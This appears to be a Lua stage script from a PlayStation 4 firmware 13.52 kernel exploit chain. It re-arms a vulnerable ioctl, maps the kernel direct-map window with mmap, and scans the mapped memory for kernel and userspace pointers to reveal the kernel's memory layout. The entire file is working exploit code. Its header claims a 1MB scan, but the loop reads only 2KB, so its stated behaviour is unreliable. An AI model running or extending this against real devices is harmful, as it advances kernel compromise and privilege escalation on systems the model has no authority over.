-- PS4 FW 13.52 - WINDOW LAYOUT REVEAL (r9ab): map non-zero regions, hunt kernel pointers
-- Scans 1MB of the kernel dmap window for non-zero content and kernel-VA pointers.

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9AB START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
  mem.write_qword(buf, 0x2ec48000)
  mem.write_qword(buf + 8, 0x100000)
  local rarm = t(S.ioctl(5, 0x80108002, buf))
  local m = t(S.mmap(0x2ec48000, 0x100000, 3, 0x0001, 5, 0))
  print(string.format("  re-arm=%d mmap=0x%x", rarm, m))

  local KB = 0x400
  local runs = {}
  local inrun = false
  local runstart, runend
  local kptr = 0
  local uptr = 0
  for i = 0, 0xff do
    local v = rq(m + i * 8)
    if v ~= 0 then
      if not inrun then inrun = true runstart = i end
      runend = i
      if v >= 0xfffffff000000000 then kptr = kptr + 1 end
      if v >= 0x8000000000000000 and v < 0xfffffff000000000 then uptr = uptr + 1 end
    elseif inrun then
      runs[#runs + 1] = { runstart * 8, runend * 8 }
      inrun = false
    end
  end
  if inrun then runs[#runs + 1] = { runstart * 8, runend * 8 } end

  print(string.format("  non-zero runs in 1MB: %d, kernel-ptr qwords: %d, userspace-ptr qwords: %d", #runs, kptr, uptr))
  for idx, r in ipairs(runs) do
    if idx > 40 then print(string.format("    ... and %d more runs", #runs - 40)) break end
    print(string.format("    run %2d: +0x%06x..+0x%06x (%5d B)", idx, r[1], r[2], r[2] - r[1] + 8))
  end
end)
print("=== R9AB DONE ===")
